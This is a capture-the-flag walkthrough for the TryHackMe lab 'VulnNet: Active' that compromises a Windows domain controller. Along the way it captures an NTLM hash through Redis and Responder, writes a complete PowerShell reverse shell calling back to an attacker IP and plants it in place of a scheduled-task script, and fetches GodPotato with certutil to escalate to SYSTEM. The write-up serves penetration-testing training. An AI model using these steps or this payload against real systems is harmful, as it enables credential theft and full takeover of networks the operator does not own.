# **VulnNet: Active - TryHackMe**

*Target Ip. Address: 10.48.174.150*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.174.150
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 11:38 +0545
Nmap scan report for 10.48.174.150 (10.48.174.150)
Host is up (0.035s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-23T05:53:33
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.69 seconds
```

Well !!! We got an AD services, but it is hardened. We cannot get lot of info from here.

```bash
kali@kali:smbclient -L //10.48.174.150
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.174.150 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We have no shares for guest/anonymous logon. Let's try to get the domain name first, so that we can start enumerating.

```bash
kali@kali:crackmapexec smb 10.48.174.150                                                                                                                           
SMB         10.48.174.150   445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
```

We finally have the domain name for this challenge. Let's add it in our hosts file.

```bash
kali@kali:cat /etc/hosts
10.48.174.150   vulnnet.local
 
127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

We don't have much of attack surface. Let's try to do full port scan to ensure we didn't miss anything.

```bash
kali@kali:nmap -p- 10.48.174.150
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 11:53 +0545
Nmap scan report for vulnnet.local (10.48.174.150)
Host is up (0.035s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
6379/tcp  open  redis
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49710/tcp open  unknown
49782/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 142.64 seconds
```

We have redis service open. Let's see if we find anything there.

```bash
kali@kali:redis-cli -h 10.48.174.150
10.48.174.150:6379> KEYS *
(empty array)
```

Unfortuntely, we have nothing in redis. But we can try to do LLMNR poisoning attack, to capture the NTLM hash through redis-cli.

Start a responder listening at tun0.

```bash
kalI@kali:sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Sponsor this project: [USDT: TNS8ZhdkeiMCT6BpXnj4qPfWo3HpoACJwv] , [BTC: 15X984Qco6bUxaxiR8AmTnQQ5v1LJ2zpNo]

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]
.
.
.
[*] Version: Responder 3.2.0.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events... 
```

Let's send a brodcast from redis-cli.

```bash
10.48.174.150:6379> SLAVEOF 192.168.130.26 6379
OK
```

Should receive the NTLM hash shortly.

```bash
[*] Version: Responder 3.2.0.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.48.174.150
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:140e94b13e28d6fc:E22CE47081A9F7DA55579C83E14621D6:0101.....000000
```

We got the hash for enterprise-security. Let's get cracking.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sa...98  (enterprise-security)
1g 0:00:00:01 DONE (2026-02-23 11:58) 0.5524g/s 2217Kp/s 2217Kc/s 2217KC/s sandoval69..sand36
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

We have no services running that can help us get remote connection. So, let's see if we can get shares for this users.

```bash
kali@kali:smbclient -L //10.48.174.150/ -U 'vulnnet.local/enterprise-security%sa...98'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Enterprise-Share Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.174.150 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We have shares for this users. Enterprise-Share seems interesting.

```bash
kali@kali:smbclient //10.48.174.150/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_08...98'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 24 04:30:41 2021
  ..                                  D        0  Wed Feb 24 04:30:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:18:18 2021

                9558271 blocks of size 4096. 4949859 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

```bash
kali@kali:cat PurgeIrrelevantData_1826.ps1
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

We have a powershell script. This powershell script is the likely a scheduled task, we can simply replace this file with our powershell script, that will be executed.

```bash
kali@kali:cat PurgeIrrelevantData_1826.ps1
#rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
$LHOST = "192.168.130.26";
$LPORT = 4444;
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
$NetworkStream = $TCPClient.GetStream();
$StreamReader = New-Object IO.StreamReader($NetworkStream);
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
$StreamWriter.AutoFlush = $true;
$Buffer = New-Object System.Byte[] 1024;
while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);
$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) };
if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ };
$StreamWriter.Write("$Output`n");
$Code = $null } };
$TCPClient.Close();
$NetworkStream.Close();
$StreamReader.Close();
$StreamWriter.Close()
```

Start a listener. I am using metasploit module for listener.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.130.26:4444
```

We can simply replace the script with put command in smb share.

```bash
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (9.6 kB/s) (average 9.6 kB/s)
```

Let's wait for the scheduled task to run and execute our script.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.130.26:4444 
[*] Command shell session 1 opened (192.168.130.26:4444 -> 10.48.174.150:49742) at 2026-02-23 12:27:07 +0545

whoami
vulnnet\enterprise-security
```

We got a command shell. This shell is very weak, attempt to upgrade is just killing it. I will just continue with this.

```bash
type user.txt
THM{3e.....1e}
```

The first flag is found at Desktop folder.

Let's check for the privileges this user has.

```bash
whoami /priv

PRIVILEGES INFORMATION ----------------------
Privilege                     NameDescription                           State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Great we have SeImpersonatePrivilege enabled, it's time for GodPotato.

First, let's get it on the machine.

```bash
certutil -urlcache -f -split http://192.168.130.26/GodPotato-NET4.exe GodPotato-NET4.exe
****  Online  ****   0000  ...   e000 CertUtil: -URLCache command completed successfully.
```

Let's fire up the GodPotato to run commands as administrator.

```bash
./GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140734272897024
[*] DispatchTable: 0x140734275214512
[*] UseProtseqFunction: 0x140734274593408
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\d78f46d8-52ad-46cc-a830-5f3a7e229de6\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009c02-0c64-ffff-be33-e26d7a7fd106
[*] DCOM obj OXID: 0xb2d76ead8b240340
[*] DCOM obj OID: 0xee5d279097f6022
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 860 Token:0x628  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2144
```

That was a success. We successfully can run command as NT AUTHORITY\SYSTEM. You can try to get a reverse shell, but I will just get the final flag and complete this challenge.

```bash
./GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\System.txt"
[*] CombaseModule: 0x140734272897024
[*] DispatchTable: 0x140734275214512
[*] UseProtseqFunction: 0x140734274593408
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\2c6378ab-5c97-48d2-8b06-5e8e45d0f623\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000002-0958-ffff-179f-3c5053bb5875
[*] DCOM obj OXID: 0x7e2a81feb23693e2
[*] DCOM obj OID: 0x9d3b8801e4e0b466
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 860 Token:0x796  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1204 THM{d5.....9b}
```
